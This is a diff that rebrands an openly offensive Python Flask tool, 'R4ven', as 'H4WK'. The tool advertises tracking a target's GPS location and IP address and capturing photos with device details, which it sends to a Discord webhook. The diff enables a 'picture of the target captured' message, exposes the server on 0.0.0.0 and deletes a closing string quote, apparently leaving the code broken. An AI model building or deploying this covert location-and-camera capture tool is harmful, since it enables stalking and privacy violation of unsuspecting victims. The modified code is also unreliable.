@@ -11,7 +11,7 @@ import requests
 import argparse
 
 # Set up logging
-log_file = "r4ven.log"
+log_file = "H4WK.log"
 logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
 
 DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
@@ -23,7 +23,7 @@ website = 'https://spyboy.in/'
 blog = 'https://spyboy.blog/'
 github = 'https://github.com/spyboy-productions/r4ven'
 
-VERSION = '1.1.4'
+VERSION = '2.0'
 
 if sys.stdout.isatty():
     R = '\033[31m'  # Red
@@ -57,13 +57,6 @@ Track info will be sent to your discord webhook
                     `\ /`
                      ( )
                       Y
-
-__________    _________   _______________ _______   
-\______   \  /  |  \   \ /   /\_   _____/ \      \  
- |       _/ /   |  |\   Y   /  |    __)_  /   |   \ 
- |    |   \/    ^   /\     /   |        \/    |    \
- |____|_  /\____   |  \___/   /_______  /\____|__  /
-        \/      |__|                  \/         \/ 
 '''
 
 banner = rf'''{G}                                                    
@@ -74,7 +67,7 @@ banner = rf'''{G}
    ".'.'."{B}=.=.=.=.-,/   \,-{B}.=.=.=.=".{W}'.'."
      `~.`.{M}`.`.`.`.`.     .'.'.'.'.'.'{W}.~`
         `~.`` {M}` `{W}.`.\   /.'{M}.' ' ''{W}.~`
-   {G}R4ven{W}   `=.-~~-._ ) ( _.-~~-.=`
+   {G}H4WK{W}   `=.-~~-._ ) ( _.-~~-.=`
                     `\ /`
                      ( )
                       Y
@@ -83,12 +76,12 @@ ____________________________________________________________________________
 {R}Track{W} {G}GPS location{W}, and {G}IP address{W}, and {G}capture photos{W} with {G}device details{W}.
 ____________________________________________________________________________
 
-'''
+
 
 app = Flask(__name__)
 
 parser = argparse.ArgumentParser(
-    description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
+    description="H4WK- Track device location, and IP address, and capture a photo with device details.",
     usage=f"{sys.argv[0]} [-t target] [-p port]"
 )
 parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
@@ -156,7 +149,7 @@ def image():
     i = request.files['image']
     f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
     i.save('%s/%s' % (os.getcwd(), f))
-    #print(f"{B}[+] {C}Picture of the target captured and saved")
+    print(f"{B}[+] {C}Picture of the target captured and saved")
 
     webhook_url = check_and_get_webhook_url(os.getcwd())
     files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
@@ -173,7 +166,7 @@ def get_user_choice():
     print(f"{Y}1. {W}Track Target GPS Location")
     print(f"{Y}2. {W}Capture Target Image")
     print(f"{Y}3. {W}Fetch Target IP Address")
-    print(f"{Y}4. {W}All Of It")
+    print(f"{Y}4. {W}All Of It (UPDATED)")
     print(f"\n{M}Note: {W}IP address & Device details available in all the options")
     choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
     return choice
@@ -267,7 +260,7 @@ def main():
     
     # Start the Flask server
     #start_message = f"{G}[+] {C}Flask server started!{W}"
-    start_message = f"{G}[+] {C}Flask server started! Running on {W}http://127.0.0.1:{args.port}/\n {R}Press CTRL+C to quit{W}"
+    start_message = f"{G}[+] {C}Flask server started! Running on {W}http://0.0.0.0:{args.port}/\n {R}Press CTRL+C to quit{W}"
     print(f"\n{start_message}\n")
     logging.info(start_message)
     
